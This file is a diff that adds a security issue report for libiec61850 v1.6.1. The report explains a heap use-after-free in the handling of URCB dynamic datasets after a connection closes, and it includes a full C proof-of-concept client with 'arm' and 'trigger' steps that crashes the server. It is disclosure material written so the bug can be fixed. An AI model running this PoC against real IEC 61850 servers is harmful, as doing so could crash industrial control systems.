@@ -1,0 +1,209 @@
+issue #596
+
+Summary
+I found a server-side heap-use-after-free in libiec61850 v1.6.1 when an association-specific dynamic data set is bound to a URCB, the owning MMS connection is closed, and a later connection reuses the same URCB and re-enables reporting.
+
+The issue is caused by a lifetime mismatch between:
+
+the connection-scoped MMS named variable list that backs @dataset objects, and
+the longer-lived URCB runtime state (rc->dataSet).
+In the vulnerable flow, the first client creates an association-specific dataset such as @ds1 and assigns it to a URCB. When that client disconnects, the server destroys the connection-owned MmsNamedVariableList and frees its internal heap strings. However, the URCB still retains a dynamic DataSet whose metadata aliases that released object. When another client later writes the same URCB and report processing revalidates the dataset, updateReportDataset() compares the new name against the stale rc->dataSet->name and dereferences freed heap memory in strcmp, leading to a reproducible crash.
+
+The crash is reachable through a real MMS/IEC 61850 server state-machine path using the official example server(examples/server_example_basic_io/server_example_basic_io).
+
+Root Cause
+1. Association-specific datasets are backed by connection-owned MMS named variable lists
+When the server handles creation of an association-specific dataset, it creates an MMS named variable list using:
+
+MmsNamedVariableList_create(domain, variableListName, true)
+That object stores the dataset name as a heap string. In src/mms/iso_mms/server/mms_named_variable_list.c, the constructor copies the name:
+
+self->name = StringUtils_copyString(name);
+This means names such as ds1 are allocated on the heap and owned by the MmsNamedVariableList instance.
+
+2. URCB dataset binding converts that connection-owned object into a runtime DataSet
+When URCB.DatSet is written with an association-specific name (for example @ds1), updateReportDataset() resolves the MMS named variable list from the current connection and builds a runtime dataset from it:
+
+mmsVariableList = MmsServerConnection_getNamedVariableList(connection, dataSetName + 1);
+dataSet = MmsMapping_createDataSetByNamedVariableList(mapping, mmsVariableList);
+rc->isDynamicDataSet = true;
+Later, if the dataset is accepted, the resulting object becomes the URCB runtime dataset:
+
+rc->dataSet = dataSet;
+3. The dynamic DataSet metadata aliases the original MMS named variable list instead of owning an independent deep copy
+The core ownership error is in MmsMapping_createDataSetByNamedVariableList(...) in src/iec61850/server/mms_mapping/mms_mapping.c.
+
+The resulting DataSet is populated by directly reusing pointers from the source MmsNamedVariableList and its entries, instead of duplicating the metadata it depends on. The relevant assignments are:
+
+dataSet->name = variableList->name;
+dataSetEntry->variableName = listEntry->variableName;
+dataSetEntry->componentName = listEntry->componentName;
+This establishes a shallow alias between:
+
+rc->dataSet metadata, and
+the connection-owned MmsNamedVariableList internals.
+As a result, the URCB runtime object does not have a self-contained lifetime.
+
+4. Connection teardown frees the MMS named variable list and its strings
+When the original client disconnects, MmsServerConnection_destroy() destroys the connection-owned list of named variable lists:
+
+LinkedList_destroyDeep(self->namedVariableLists,
+    (LinkedListValueDeleteFunction) MmsNamedVariableList_destroy);
+Then MmsNamedVariableList_destroy() frees the heap-allocated name:
+
+GLOBAL_FREEMEM(self->name);
+Therefore, after connection teardown, the original backing string for ds1 is gone.
+
+5. URCB state is deactivated, but the stale dynamic DataSet is not synchronously detached before later reuse
+On disconnect, report state for the connection is disabled, but the bug is that the stale rc->dataSet metadata can survive long enough to be re-used by later URCB processing. The report-control logic clears runtime report state, but does not guarantee that all connection-derived dynamic dataset metadata has been severed before a subsequent client revalidates the URCB.
+
+This creates a classic lifetime mismatch:
+
+the backing MMS named variable list is connection-scoped and already destroyed,
+while the URCB runtime dataset metadata is still consulted later.
+6. The actual UAF is triggered during dataset name comparison in updateReportDataset()
+On the later connection, updateReportDataset() enters the path that compares the already-bound dataset against the new requested dataset name. For association-specific datasets, it does:
+
+strcmp(dataSetName, newDataSetName + 1)
+At this point, dataSetName comes from the old rc->dataSet->name, which still points to the heap memory freed during the earlier connection teardown. ASan then reports a heap-use-after-free in strcmp.
+
+PoC
+
+#include "iec61850_client.h"
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+static void
+die(const char* what, IedClientError err)
+{
+    fprintf(stderr, "%s failed (err=%d)\n", what, err);
+    exit(1);
+}
+
+static IedConnection
+connect_or_die(const char* host, int port)
+{
+    IedClientError err;
+    IedConnection con = IedConnection_create();
+
+    IedConnection_connect(con, &err, host, port);
+
+    if (err != IED_ERROR_OK)
+        die("connect", err);
+
+    return con;
+}
+
+static LinkedList
+create_entries(void)
+{
+    LinkedList entries = LinkedList_create();
+
+    LinkedList_add(entries, "simpleIOGenericIO/GGIO1.SPCSO1.stVal[ST]");
+    LinkedList_add(entries, "simpleIOGenericIO/GGIO1.SPCSO2.stVal[ST]");
+    LinkedList_add(entries, "simpleIOGenericIO/GGIO1.SPCSO3.stVal[ST]");
+    LinkedList_add(entries, "simpleIOGenericIO/GGIO1.SPCSO4.stVal[ST]");
+
+    return entries;
+}
+
+static void
+mode_arm(const char* host, int port)
+{
+    IedClientError err;
+    IedConnection con = connect_or_die(host, port);
+
+    LinkedList entries = create_entries();
+    IedConnection_createDataSet(con, &err, "@ds1", entries);
+    LinkedList_destroyStatic(entries);
+
+    if (err != IED_ERROR_OK)
+        die("create @ds1", err);
+
+    ClientReportControlBlock rcb =
+        IedConnection_getRCBValues(con, &err, "simpleIOGenericIO/LLN0.RP.EventsRCB01", NULL);
+
+    if (err != IED_ERROR_OK || rcb == NULL)
+        die("getRCBValues", err);
+
+    ClientReportControlBlock_setResv(rcb, true);
+    ClientReportControlBlock_setDataSetReference(rcb, "@ds1");
+
+    IedConnection_setRCBValues(con, &err, rcb, RCB_ELEMENT_RESV | RCB_ELEMENT_DATSET, true);
+
+    if (err != IED_ERROR_OK)
+        die("setRCBValues", err);
+
+    printf("armed URCB with @ds1 and closing connection\n");
+
+    ClientReportControlBlock_destroy(rcb);
+    IedConnection_close(con);
+    IedConnection_destroy(con);
+}
+
+static void
+mode_trigger(const char* host, int port)
+{
+    IedClientError err;
+    IedConnection con = connect_or_die(host, port);
+
+    ClientReportControlBlock rcb =
+        IedConnection_getRCBValues(con, &err, "simpleIOGenericIO/LLN0.RP.EventsRCB01", NULL);
+
+    if (err != IED_ERROR_OK || rcb == NULL)
+        die("getRCBValues", err);
+
+    ClientReportControlBlock_setResv(rcb, true);
+    IedConnection_setRCBValues(con, &err, rcb, RCB_ELEMENT_RESV, true);
+
+    if (err != IED_ERROR_OK)
+        die("reserve RCB", err);
+
+    ClientReportControlBlock_setRptEna(rcb, true);
+    IedConnection_setRCBValues(con, &err, rcb, RCB_ELEMENT_RPT_ENA, true);
+
+    if (err != IED_ERROR_OK)
+        die("enable report", err);
+
+    printf("enabled report on stale @ds1\n");
+
+    ClientReportControlBlock_destroy(rcb);
+    IedConnection_close(con);
+    IedConnection_destroy(con);
+}
+
+int
+main(int argc, char** argv)
+{
+    const char* host = "127.0.0.1";
+    int port = 102;
+
+    if (argc < 2) {
+        fprintf(stderr, "usage: %s arm|trigger [host] [port]\n", argv[0]);
+        return 1;
+    }
+
+    if (argc > 2)
+        host = argv[2];
+
+    if (argc > 3)
+        port = atoi(argv[3]);
+
+    if (strcmp(argv[1], "arm") == 0)
+        mode_arm(host, port);
+    else if (strcmp(argv[1], "trigger") == 0)
+        mode_trigger(host, port);
+    else {
+        fprintf(stderr, "unknown mode: %s\n", argv[1]);
+        return 1;
+    }
+
+    return 0;
+}
+
+Arm the stale state with the first connection
+./poc arm 127.0.0.1 11012
+Trigger with the second connection
+./poc trigger 127.0.0.1 11012
